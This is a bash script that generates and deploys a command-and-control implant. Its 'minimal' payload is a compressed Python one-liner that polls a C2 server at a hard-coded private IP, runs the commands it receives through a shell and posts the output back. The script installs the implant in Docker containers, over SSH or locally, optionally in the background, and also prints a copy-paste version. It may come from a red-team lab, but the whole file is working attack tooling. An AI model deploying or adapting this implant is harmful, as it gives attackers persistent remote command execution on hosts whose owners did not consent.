#!/bin/bash
"""
Quick Client Deployment Helper
Deploy lightweight clients to targets quickly
"""

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

usage() {
    echo "Quick Client Deployment Helper"
    echo ""
    echo "Usage: $0 [OPTIONS] TARGET"
    echo ""
    echo "Options:"
    echo "  -h, --help          Show this help"
    echo "  -t, --type TYPE     Client type (minimal|light|shell)"
    echo "  -c, --c2 HOST       C2 server host (default: 192.168.210.170)"
    echo "  -p, --port PORT     C2 server port (default: 8080)"
    echo "  -o, --oneliner      Generate one-liner only (no deployment)"
    echo "  -b, --background    Run client in background"
    echo ""
    echo "Targets:"
    echo "  docker:CONTAINER    Deploy to Docker container"
    echo "  ssh:USER@HOST       Deploy via SSH"
    echo "  local               Run locally"
    echo ""
    echo "Examples:"
    echo "  $0 -t minimal docker:linux_endpoint1"
    echo "  $0 -t light ssh:user@192.168.1.100"
    echo "  $0 -o -t minimal"
    echo "  $0 -b local"
}

# Default values
CLIENT_TYPE="minimal"
C2_HOST="192.168.210.170"
C2_PORT="8080"
ONELINER_ONLY=false
BACKGROUND=false
TARGET=""

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            usage
            exit 0
            ;;
        -t|--type)
            CLIENT_TYPE="$2"
            shift 2
            ;;
        -c|--c2)
            C2_HOST="$2"
            shift 2
            ;;
        -p|--port)
            C2_PORT="$2"
            shift 2
            ;;
        -o|--oneliner)
            ONELINER_ONLY=true
            shift
            ;;
        -b|--background)
            BACKGROUND=true
            shift
            ;;
        -*)
            print_error "Unknown option: $1"
            usage
            exit 1
            ;;
        *)
            TARGET="$1"
            shift
            ;;
    esac
done

# Generate payloads
generate_minimal() {
    cat << EOF
python3 -c "
import urllib.request as u,json,subprocess as s,time,platform as p,os
i=f'{p.node()}-{os.getpid()}';c='http://${C2_HOST}:${C2_PORT}'
while 1:
 try:r=u.urlopen(f'{c}/api/clients/{i}',timeout=10);d=json.loads(r.read())
 except:time.sleep(10);continue
 for x in d.get('commands',[]):
  try:o=s.run(x['command'],shell=1,capture_output=1,text=1,timeout=30);u.urlopen(u.Request(f'{c}/api/results',json.dumps({'client_id':i,'command_id':x['id'],'result':{'stdout':o.stdout,'stderr':o.stderr,'exit_code':o.returncode}}).encode(),{'Content-Type':'application/json'}))
  except:pass
 time.sleep(5)
"
EOF
}

generate_light() {
    echo "python3 light_client.py ${C2_HOST} ${C2_PORT}"
}

generate_shell() {
    echo "bash shell_client.sh ${C2_HOST} ${C2_PORT}"
}

# Main execution
main() {
    print_status "Quick Client Deployment Helper"
    print_status "Client Type: ${CLIENT_TYPE}"
    print_status "C2 Server: ${C2_HOST}:${C2_PORT}"
    
    # Generate payload
    case $CLIENT_TYPE in
        minimal)
            PAYLOAD=$(generate_minimal)
            ;;
        light)
            PAYLOAD=$(generate_light)
            ;;
        shell)
            PAYLOAD=$(generate_shell)
            ;;
        *)
            print_error "Unknown client type: ${CLIENT_TYPE}"
            print_error "Supported types: minimal, light, shell"
            exit 1
            ;;
    esac
    
    # If oneliner only, just print and exit
    if [[ "$ONELINER_ONLY" == true ]]; then
        print_success "Generated ${CLIENT_TYPE} payload:"
        echo "$PAYLOAD"
        echo ""
        print_status "Copy and paste the above command to deploy"
        exit 0
    fi
    
    # Validate target
    if [[ -z "$TARGET" ]]; then
        print_error "Target is required (use -o for oneliner only)"
        usage
        exit 1
    fi
    
    # Deploy based on target type
    case $TARGET in
        docker:*)
            CONTAINER="${TARGET#docker:}"
            print_status "Deploying to Docker container: ${CONTAINER}"
            
            if [[ "$BACKGROUND" == true ]]; then
                docker exec -d "${CONTAINER}" ${PAYLOAD}
                print_success "Client deployed in background to ${CONTAINER}"
            else
                print_status "Testing deployment (foreground):"
                docker exec "${CONTAINER}" ${PAYLOAD}
            fi
            ;;
            
        ssh:*)
            SSH_TARGET="${TARGET#ssh:}"
            print_status "Deploying via SSH to: ${SSH_TARGET}"
            
            if [[ "$BACKGROUND" == true ]]; then
                ssh "${SSH_TARGET}" "nohup ${PAYLOAD} >/dev/null 2>&1 &"
                print_success "Client deployed in background to ${SSH_TARGET}"
            else
                print_status "Testing deployment (foreground):"
                ssh "${SSH_TARGET}" "${PAYLOAD}"
            fi
            ;;
            
        local)
            print_status "Running client locally"
            
            if [[ "$BACKGROUND" == true ]]; then
                nohup ${PAYLOAD} >/dev/null 2>&1 &
                print_success "Client running in background locally"
            else
                print_status "Running client (foreground):"
                ${PAYLOAD}
            fi
            ;;
            
        *)
            print_error "Unknown target format: ${TARGET}"
            print_error "Supported formats: docker:CONTAINER, ssh:USER@HOST, local"
            exit 1
            ;;
    esac
}

# Run main function
main "$@"